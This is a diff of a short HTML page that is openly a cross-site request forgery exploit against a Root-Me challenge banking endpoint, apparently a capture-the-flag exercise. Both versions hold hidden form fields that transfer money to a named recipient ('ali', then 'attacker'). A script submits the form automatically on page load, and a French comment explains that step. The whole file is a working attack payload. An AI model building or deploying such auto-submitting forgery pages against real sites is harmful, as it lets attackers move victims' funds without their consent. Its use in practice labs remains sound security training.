@@ -1,15 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Tkt jte vole de l'argent</title>
+    <title>CSRF Exploit</title>
 </head>
 <body>
-    <form id="csrf" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
-        <input type="hidden" name="recipient" value="ali">
-        <input type="hidden" name="amount" value="1000000">
+    <form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="POST">
+        <input type="hidden" name="recipient" value="attacker">
+        <input type="hidden" name="amount" value="1000">
     </form>
     <script>
-        document.getElementById('csrf').submit();
+        // Soumet automatiquement le formulaire lorsque la page est chargée
+        document.getElementById('csrfForm').submit();
     </script>
 </body>
 </html>
